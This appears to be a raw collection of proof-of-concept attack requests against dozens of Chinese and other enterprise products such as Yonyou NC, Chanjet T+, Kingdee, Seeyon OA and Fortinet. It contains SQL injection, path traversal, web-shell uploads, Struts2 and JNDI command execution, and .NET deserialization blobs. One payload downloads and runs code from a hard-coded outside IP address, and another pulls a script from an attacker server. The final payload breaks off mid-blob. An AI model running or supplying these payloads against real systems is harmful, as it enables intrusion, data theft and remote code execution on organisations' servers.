POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=09133CFE3A7B0CE8341AB1A7DEDFCCDE.server
Connection: keep-aliveSOAP
Action: urn:loadFields
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 350

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
   <soapenv:Header/>   
   <soapenv:Body>      
   <imet:loadFields>         
   <!--type: string-->         
   <imet:string>SmartModel^1';*</imet:string>      
   </imet:loadFields>   
   </soapenv:Body>
</soapenv:Envelope>

NAME:\用友\用友BIP数据应用服务未授权访问GLSyncService.asmx.txt
POC:
GET /bi/api/SemanticModel/GetOlapConnectionList/?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_263720ea7e397482da220115cae828_1214162142339 HTTP/1.1

NAME:\用友\用友FE协同平台uploadFile.jsp存在文件上传.txt
POC:
POST /service/FileManageServlet HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/octet-stream

{{unquote("\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\x0aloadFactorI\x00\x09thresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x03t\x00\x04patht\x00\x12C:\\Windows\\win.init\x00\x06dsNamet\x00\x03plmt\x00\x08operTypet\x00\x0ddownloadlocalx")}}

NAME:\用友\用友NC changeEvent接口存在SQL注入漏洞.txt
POC:
POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

event_id=1' AND 1=dbms_pipe.receive_message('RDS',5)--+#&startDate=2025-07-01 00:00:00&startDate_old=2025-07-01 24:00:00

NAME:\用友\用友NC getFormItem doPost SQL注入.txt
POC:
POST /portal/pt/servlet/getFormItem/doPost?pageId=login&clazz=nc.uap.wfm.vo.base.ProDefBaseVO&proDefPk=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19


NAME:\用友\用友NC getFormltem doPost SQL注入.txt
POC:
/portal/pt/servlet/getFormltem/doPost

NAME:\用友\用友NC qrySubPurchaseOrgByParentPk 存在SQL注入.txt
POC:
POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) --

NAME:\用友\用友NC-Cloud IBapIOService存在SQL注入.txt
POC:
POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml 

<?xml version="1.0" encoding="UTF-8" standalone="no"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">    <soapenv:Header/>    <soapenv:Body>        <gs:getBapTableDatas>            <gs:stringarrayItem>                DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')-- abc            </gs:stringarrayItem>        </gs:getBapTableDatas>    </soapenv:Body></soapenv:Envelope>

NAME:\用友\用友OA系统U8Cloud FilterCondAction SQL注入.txt
POC:
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.bi.report.rep.FilterCondAction&method=execute&repID=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1

NAME:\用友\用友U9 Cloud DynamaticExport.aspx 接口任意文件下载.txt
POC:
GET /Portal/Print/DynamaticExport.aspx?filePath=../../etc/passwd HTTP/1.1

NAME:\用友\用友U9 Cloud printDynamaticExport.aspx 接口任意文件下载.txt
POC:
GET Portal/Print/DynamaticExport.aspx?filePath=../../etc/passwd HTTP/1.1

NAME:\用友\用友时空KSOA workslist.jsp SQL注入.txt
POC:
GET /worksheet/workslist.jsp?id=1';WAITFOR+DELAY+'0:0:3 HTTP/1.1

NAME:\畅捷通\用友 畅捷通-TPlus SQL注入.txt
POC:
POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.445.106 Safari/537.36
Content-Length: 248
Connection: close
Content-Type: application/json
Accept-Encoding: gzip

{"accNum": "3' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))-- NCab", "functionTag": "SYS0104", "url": ""}

NAME:\畅捷通\用友 畅捷通AddressSettingController存在SSRF.txt
POC:
POST /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?method=TestConnnect HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=sfzg0pgxvld3ltgimecqkjg4; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1721822405; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1721822415; HMACCOUNT=AFE08148BD092161
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

{
  "address":"bftsce.dnslog.cn"
}

NAME:\畅捷通\用友 畅捷通T+ FileUploadHandler任意文件上传.txt
POC:
POST /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.2527.28 Safari/537.36
Content-Length: 554
Connection: close
Content-Type: multipart/form-data; boundary=f95ec6be8c3acff8e3edd3d910d3b9a6
Accept-Encoding: gzip

--f95ec6be8c3acff8e3edd3d910d3b9a6
Content-Disposition: form-data; name="file"; filename="123.asp"
Content-Type: image/jpeg

<%

Response.Write chr(101)&chr(49)&chr(54)&chr(53)&chr(52)&chr(50)&chr(49)&chr(49)&chr(49)&chr(48)&chr(98)&chr(97)&chr(48)&chr(51)&chr(48)&chr(57)&chr(57)&chr(97)&chr(49)&chr(99)&chr(48)&chr(51)&chr(57)&chr(51)&chr(51)&chr(55)&chr(51)&chr(99)&chr(53)&chr(98)&chr(52)&chr(51)

CreateObject("Scripting.FileSystemObject").DeleteFile(server.mappath(Request.ServerVariables("SCRIPT_NAME")))

%>

--f95ec6be8c3acff8e3edd3d910d3b9a6--




---------------------------------------------------------------------------------------------------------------------------


GET /tplus/Userfiles/123.asp HTTP/1.1

NAME:\畅捷通\用友 畅捷通T+ getdecallusers 存在信息泄露.txt
POC:
GET /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1

NAME:\畅捷通\用友 畅捷通T+ GLSyncService.asmx SQL注入.txt
POC:
POST /tplus/GLSyncService.asmx HTTP/1.1
Host: 
SOAPAction: "http://www.chanjet.com/GetSourceAccountDataTable"
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <GetSourceAccountDataTable xmlns="http://www.chanjet.com/">      <versionType>' UNION ALL SELECT NULL,@@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VsIH</versionType>    </GetSourceAccountDataTable>  </soap:Body></soap:Envelope>

NAME:\畅捷通\用友 畅捷通T+ keyEdit.aspx 存在SQL注入.txt
POC:
GET /tplus/UFAQD/keyEdit.aspx?KeyID=222%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1

NAME:\畅捷通\用友畅捷通TPLUS AccountClearControler SQL注入.txt
POC:
GET /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1

NAME:\畅捷通\畅捷通CRM newleadset.php 存在SQL注入.txt
POC:
/lead/newleadset.php?gblOrgID=1+AND+%28SELECT+5244+FROM+%28SELECT%28SLEEP%289%29%29%29HAjH%29--+-&DontCheckLogin=1

NAME:\畅捷通\畅捷通T+Load处存在SQL注入.txt
POC:
//tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=%27);declare%20%40shell%20int%3Bexec%20sp_oacreate%20%22wscript.shell%22%2C%40shell%20output%3Bexec%20sp_oamethod%20%40shell%2C%22run%22%2Cnull%2C%22sqlps%20IEX%20((new-object%20net.webclient).downloadstring('http%3A%2F%2F103.199.106.62%3A6000%2Fbeta'))%22%3b--+

NAME:\百易云\百易云资管系统imaRead.make.php SQL注入.txt
POC:
POST /adminx/imaRead.make.php?act=remake HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246

feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)

NAME:\科立讯\福建科立讯通信有限公司 logout.php SQL注入.txt
POC:
GET /custom/zx/logout.php?sign=1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(16)))Vgsc)--+qhh HTTP/1.1

NAME:\紫光\紫光System WorkFlow download任意文件读取.txt
POC:
POST /System/WorkFlow/download.html?path=C:\Windows\win.ini HTTP/1.1
Accept-Encoding: gzip, deflate

--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="userID"

admin
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="fondsid"

1
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="comid"

1
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="token"

5117e82385cef4c12547fdd4c028b97a1-1
--vow8ojiofbpypwih3t3i--

NAME:\维达\维达外贸客户关系管理系统 sendmailview.jsp SQL注入.txt
POC:
GET /wap/common/sendmailview.jsp?commonid=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1

NAME:\网仕\上海网仕科技 Transcoder MS index.php SQL注入.txt
POC:
POST /webtrans/index.php?controller=user%action=login HTTP/1.1
Host: 

name=testaaa;) AND (SELECT 3333 FROM (SELECT(SLEEP(4)))xSEI) AND ('aFKS'='aFKS&pass=QWR5U2VjCg%3D%3D&lang=zh_CN

NAME:\美特CRM\美特CRM存在druid未授权访问.txt
POC:
fofa：
body="MetaCRM6"||title="MetaCRM7客户关系管理系统"

poc：
GET /druid/websession.html

NAME:\群晖\群晖ABM全局客户端密钥信息泄露CVE-2025-4679.txt
POC:
NAS OS<= DSM 7.2.2-72806

POST /ActiveBackupForMicrosoft365/dsm7_office365.php HTTP/2
Host: synooauth.synology.com

action=SYNOGetAccessToken&code=1.Aa4ABLPUicJgkEm4oYYvptoHGdo08rQaOk1[...]&state=SecretExposurePoC&location=RandomNonValidDSMLocationURI

NAME:\联想\联想网盘write存在任意文件上传漏洞.txt
POC:
POST /write?neid=1&hash=../../../../../../../dragonball/srv/tomcat/webapps/stream_server/ttt.txt&status=1 HTTP/1.1
Host:xxxx
Cache-Control:max-age=0
Sec-Ch-Ua:"Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile:?0
Sec-Ch-Ua-Platform:"Windows"
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site:none
Sec-Fetch-Mode:navigate
Sec-Fetch-User:?1
Sec-Fetch-Dest:document
Accept-Language:zh-CN,zh;q=0.9
Connection:close
Content-Type:application/octet-stream
Accept-Encoding:gzip, deflate
Content-Length:8

Testtest


NAME:\联软\联软UniSDP 零信任访问控制系统 emm-coreoauthtoken 信息泄露.txt
POC:
GET /emm-core/oauth/token HTTP/1.1

NAME:\致远\致远OA任意文件上传CVE-2025-34040wpsAssistServlet.txt
POC:
GET /seeyon/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/test.txt&fileId=1&123123= HTTP/1.1

NAME:\若依\若依任意⽂件读取sendMessageWithAttachment.txt
POC:
GET /demo/mail/sendMessageWithAttachment?to=xxxxxx@163.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd HTTP/1.1

NAME:\蓝凌\蓝凌OA远程命令执行dataxml.tmpl.txt
POC:
POST /ekp/data/sys-common/dataxml.tmpl  HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0)  Gecko/20100101 Firefox/92.0
Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language:  zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 192

s_bean=ruleFormulaValidate&script=try {
String cmd = "ping {{interactsh-url}}";
Process child = Runtime.getRuntime().exec(cmd);
} catch (IOException e) {
System.err.println(e);
}

NAME:\通达\通达OA v2014 get_contactlist.php 敏感信息泄漏.txt
POC:
GET /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 HTTP/1.1

NAME:\金和\金和OA ModuleTaskView.aspx SQL注入.txt
POC:
POST /c6/Jhsoft.Web.dailytaskmanage/ModuleTaskView.aspx/ HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=xxxxx&__VIEWSTATEGENERATOR=09BBB40C&__EVENTTARGET=&__EVENTARGUMENT=&OriginModule=crmexec&OriginID='WAitFor+DelaY'0:0:5'--

NAME:\金和\金和OA SQL注入漏洞Tasktreejson接口.txt
POC:
GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+@@VERSION%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+  HTTP/1.1

NAME:\金和\金和OA TaskReportConfirm.aspx SQL注入.txt
POC:
POST /c6/Jhsoft.Web.dailytaskmanage/TaskReportConfirm.aspx/ HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=xxxx&__EVENTARGUMENT=&__VIEWSTATE=xxxx&txtTaskReportExplain=&chkCallViewers=on&hidReportID=0&__VIEWSTATEGENERATOR=xxxxx&id='WAitFor DelaY'0:0:5'--

NAME:\金蝶\金蝶Apusic应用服务器loadTree-JNDI注入漏洞.txt
POC:
POST /appmonitor/protect/jndi/loadTree HTTP/1.1
Host: your_ip
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

jndiName=ldap://***.***.***.***/Basic/Command/calc

NAME:\金蝶\金蝶云星空 DynamicFormService.CloseForm.common.kdsvc 远程代码执行.txt
POC:
POST /k3cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DynamicForm.DynamicFormService.CloseForm.common.kdsvc HTTP/1.1
cmd:dir

{"ap0":"AAAAAAAA"}

NAME:\雄伟\雄伟科技智慧食堂系统任意用户密码重置.txt
POC:
/Account/ForgetPasswordJson

NAME:\飞塔\飞塔Authorization SQL注入CVE-2025-25257.txt
POC:
GET /api/fabric/device/status HTTP/1.1
Host: 
Authorization: Bearer AAAAAA'/**/or/**/sleep(5)--/**/-'


GET /cgi-bin/x.cgi HTTP/1.1
User-Agent:ls /

NAME:\龙采\龙采商城系统 auditing 接口存在SQL注入.txt
POC:
POST /coupon/auditing HTTP/1.1
Host: 

id=1%20and%20updatexml(1,concat(0x7e,@@version,0x7e),1)



深信服&dp OSM(堡垒机)rce
POST /fort/portal_login HTTP/1.1
Host: 
Cookie: FORTSESSIONID=78DFD83A276124B65ECA5D316D66D47F
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: close
Content-Type: application/json
Content-Length: 94

{"userName":"Bob", "loginUrl":"`id`", "role":"", "password":"123456789"}

MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞

POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22

------WebKitFormBoundary03rNBzFMIytvpW22
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary03rNBzFMIytvpW22--


 AgentSyste代理商管理系统 login.action Struts2 远程代码执行漏洞

POST /login.action HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/123.0
Content-Type: application/x-www-form-urlencoded

debug=command&expression=%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22ls%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()

 NIPS 绿盟网络入侵防护系统users.json敏感信息泄漏

GET /api/config/users.json HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

泛微Ecology目录遍历漏洞

/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../

用友
POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

event_id=1' AND 1=dbms_pipe.receive_message('RDS',5)--+#&startDate=2025-06-16 00:00:00&startDate_old=2025-06-16 24:00:00

金和OA SQL注入漏洞
GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+@@VERSION%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+ HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

飞致云 DataEase Postgresql JDBC Bypass 远程代码执行漏洞 CVE-2025-49002
POST /de2api/datasource/validate HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
Accept-Language: zh-CN
Sec-Fetch-Dest: empty
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
sec-ch-ua-platform: "Windows"
Content-Type: application/json
Sec-Fetch-Mode: cors
Content-Length: 821

{
    "id": "",
    "name": "11",
    "description": "",
    "type": "h2",
    "apiConfiguration": [],
    "paramsConfiguration": [],
    "enableDataFill": false,
    "configuration": "eyJkYXRhQmFzZSI6IiIsImpkYmMiOiJqZGJjOmgyOm1lbTp0ZXN0ZGI7VFJBQ0VfTEVWRUxfU1lTVEVNX09VVD0zO2luaXQ9UlVuU0NSSVBUIEZST00gJ2h0dHA6Ly95b3VyLXZwczoyMzMzL3BvYy5zcWwnIiwidXJsVHlwZSI6ImpkYmNVcmwiLCJzc2hUeXBlIjoicGFzc3dvcmQiLCJleHRyYVBhcmFtcyI6IiIsInVzZXJuYW1lIjoiMTIzIiwicGFzc3dvcmQiOiIxMjMiLCJob3N0IjoiIiwiYXV0aE1ldGhvZCI6IiIsInBvcnQiOjAsImluaXRpYWxQb29sU2l6ZSI6NSwibWluUG9vbFNpemUiOjUsIm1heFBvb2xTaXplIjo1LCJxdWVyeVRpbWVvdXQiOjMwfQ=="
}

华测监测预警系统2.2 sysGroupEdit.aspx SQL注入
GET /Web/SysManage/sysGroupEdit.aspx?id=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2889%29%2BCHAR%28118%29%2BCHAR%2889%29%2BCHAR%2888%29%2BCHAR%28105%29%2BCHAR%28119%29%2BCHAR%2898%29%2BCHAR%28110%29%2BCHAR%2867%29%2BCHAR%28114%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2886%29%2BCHAR%2869%29%2BCHAR%28118%29%2BCHAR%2885%29%2BCHAR%28120%29%2BCHAR%28104%29%2BCHAR%28111%29%2BCHAR%2866%29%2BCHAR%2899%29%2BCHAR%2868%29%2BCHAR%2897%29%2BCHAR%2869%29%2BCHAR%28117%29%2BCHAR%2875%29%2BCHAR%2876%29%2BCHAR%28115%29%2BCHAR%2874%29%2BCHAR%2866%29%2BCHAR%2873%29%2BCHAR%2888%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2876%29%2BCHAR%2880%29%2BCHAR%2898%29%2BCHAR%28119%29%2BCHAR%2889%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29--+wkZw

浪潮云财务系统命令执行漏洞
POST /cwbase/gsp/webservice/bizintegrationwebservice/bizintegrationwebservice.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetChildFormAndEntityList"
cmd: path

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetChildFormAndEntityList xmlns="http://tempuri.org/">
<baseFormID>validStringID</baseFormID>
<baseEntityID>validStringID</baseEntityID>
<strFormAssignment>AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMctAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMAAAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlhbGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAAAAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkYAAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNpemUES2V5cwZWYWx1ZXMAAAMDAAUFCwgcU3lzdGVtLkNvbGxlY3Rpb25zLklDb21wYXJlciRTeXN0ZW0uQ29sbGVjdGlvbnMuSUhhc2hDb2RlUHJvdmlkZXII7FE4PwIAAAAKCgMAAAAJHwAAAAkgAAAADw0AAAAAEAAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwBrydRkAAAAAAAAAADgAAIhCwELAAAIAAAABgAAAAAAAN4mAAAAIAAAAEAAAAAAABAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAACQJgAASwAAAABAAACoAgAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgA